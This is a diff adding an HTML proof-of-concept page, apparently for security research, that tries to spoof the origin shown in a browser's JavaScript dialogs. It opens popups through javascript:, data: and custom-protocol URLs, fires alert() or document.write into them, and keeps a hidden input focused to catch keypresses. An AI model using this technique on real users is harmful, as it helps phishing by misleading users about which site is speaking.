@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>PoC: JS Dialog Origin Spoofing (Simplified)</title>
+    <style>
+      body {
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        line-height: 1.6;
+        margin: 0;
+        padding: 20px;
+        background-color: #f4f7f6;
+        color: #333;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        min-height: 100vh;
+      }
+
+      .container {
+        background-color: #ffffff;
+        padding: 30px;
+        border-radius: 8px;
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        max-width: 600px;
+        width: 100%;
+        text-align: center;
+      }
+
+      h1 {
+        color: #2c3e50;
+        margin-bottom: 15px;
+        font-size: 1.8em;
+      }
+
+      p {
+        margin-bottom: 20px;
+        font-size: 1.1em;
+        color: #555;
+      }
+
+      strong {
+        color: #007bff;
+      }
+
+      .info-box {
+        background-color: #e9f7ef;
+        border-left: 5px solid #28a745;
+        padding: 15px;
+        margin-top: 25px;
+        border-radius: 4px;
+        color: #218838;
+        text-align: left;
+        font-size: 0.95em;
+      }
+
+      .info-box p {
+        margin: 0;
+        color: #218838;
+      }
+
+      #focusTrigger {
+        opacity: 0;
+        width: 0;
+        height: 0;
+        position: absolute;
+        left: -9999px;
+        top: -9999px;
+        pointer-events: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>
+        Proof of Concept: JavaScript Dialog Origin Spoofing (iframe context)
+      </h1>
+      <p>
+        This page demonstrates potential JavaScript dialog origin spoofing
+        within an iframe context. Click anywhere within this frame (or press any
+        key) to trigger the PoC.
+      </p>
+      <p>
+        Current iframe origin: <strong id="originOutput">Loading...</strong>
+      </p>
+
+      <div class="info-box">
+        <p>
+          <strong>Note:</strong> This PoC is for educational and security
+          research purposes only. It showcases how JavaScript dialogs (like
+          `alert()`) can sometimes display an unexpected origin in certain
+          browser environments or configurations when initiated from within a
+          specific iframe setup. The behavior can vary significantly across
+          different browsers and versions.
+        </p>
+      </div>
+
+      <input type="text" id="focusTrigger" aria-hidden="true" tabindex="-1" />
+    </div>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        const originOutput = document.getElementById("originOutput");
+        const focusTrigger = document.getElementById("focusTrigger");
+
+        originOutput.innerText = window.location.origin;
+
+        const urlParams = new URLSearchParams(window.location.search);
+        let scenario = urlParams.get("scenario") || "popup";
+
+        const newWinParams =
+          "width=800,height=400,top=100,resizable=yes,scrollbars=yes";
+
+        const executePoC = (selectedScenario) => {
+          let win;
+
+          switch (selectedScenario) {
+            case "popup":
+              win = window.open(
+                `javascript:alert("Dialog from doc.domain: ${document.domain}, win.origin: ${window.origin}. See dialog title for potential origin spoof.")`,
+                "_blank",
+                newWinParams
+              );
+              break;
+            case "tab":
+              win = window.open(
+                `javascript:alert("Dialog from doc.domain: ${document.domain}, win.origin: ${window.origin}. See dialog title for potential origin spoof.")`,
+                "_blank"
+              );
+              break;
+            case "data":
+              win = window.open("data:,Hello World", "_blank", newWinParams);
+              if (win) {
+                setTimeout(() => {
+                  win.alert(`JS dialog from iframe, origin: ${window.origin}`);
+                }, 100);
+              }
+              break;
+            case "protocol":
+              win = window.open(
+                "test:customProtocolData",
+                "_blank",
+                newWinParams
+              );
+              if (win) {
+                setTimeout(() => {
+                  win.alert(`JS dialog from iframe, origin: ${window.origin}`);
+                }, 100);
+              }
+              break;
+            case "docwrite1":
+              try {
+                window.open(
+                  'javascript:document.write("Attempting document.write...")',
+                  "_blank",
+                  newWinParams
+                );
+              } catch (e) {
+                console.error("Error opening docwrite1 scenario:", e);
+                alert(
+                  "docwrite1 scenario failed. Browser might have blocked it."
+                );
+              }
+              break;
+            case "docwrite2":
+              win = window.open("data:,Initial Data", "_blank", newWinParams);
+              if (win) {
+                setTimeout(() => {
+                  try {
+                    win.document.write(
+                      "<h1>Content written via document.write</h1><p>This might cause issues depending on browser security policies.</p>"
+                    );
+                    win.document.close();
+                  } catch (e) {
+                    console.error("Error during docwrite2 scenario:", e);
+                    alert(
+                      "docwrite2 scenario failed. Browser might have blocked it."
+                    );
+                  }
+                }, 100);
+              }
+              break;
+            default:
+              console.warn(
+                `Unknown scenario: ${selectedScenario}. Defaulting to 'popup'.`
+              );
+              executePoC("popup");
+              break;
+          }
+        };
+
+        window.addEventListener("click", () => executePoC(scenario));
+        focusTrigger.addEventListener("keypress", () => executePoC(scenario));
+
+        setInterval(() => {
+          focusTrigger.focus();
+        }, 100);
+      });
+    </script>
+  </body>
+</html>
